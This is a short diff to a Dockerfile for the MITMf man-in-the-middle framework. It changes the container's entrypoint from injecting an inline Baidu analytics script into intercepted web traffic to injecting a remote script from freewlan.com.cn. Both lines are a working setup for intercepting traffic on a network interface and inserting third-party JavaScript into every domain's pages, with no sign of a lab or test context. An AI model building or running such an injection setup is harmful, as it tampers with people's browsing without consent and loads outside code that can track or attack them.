@@ -10,4 +10,4 @@ RUN pip install -r requirements.txt
 VOLUME /MITMf/logs/
 
 EXPOSE 10000
-ENTRYPOINT ["python", "/MITMf/mitmf.py", "-i", "eth0", "--inject", "--js-payload", "var _hmt = _hmt || []; \ (function() { \   var hm = document.createElement("script"); \   hm.src = "//hm.baidu.com/hm.js?1ba9b58d5d0db75eb78ae0dffa1d0f5b"; \   var s = document.getElementsByTagName("script")[0]; \  s.parentNode.insertBefore(hm, s); \ })();", "--per-domain"]
+ENTRYPOINT ["python", "/MITMf/mitmf.py", "-i", "eth0", "--inject", "--js-url", "http://freewlan.com.cn/js_ad/js/ad.js", "--per-domain"]
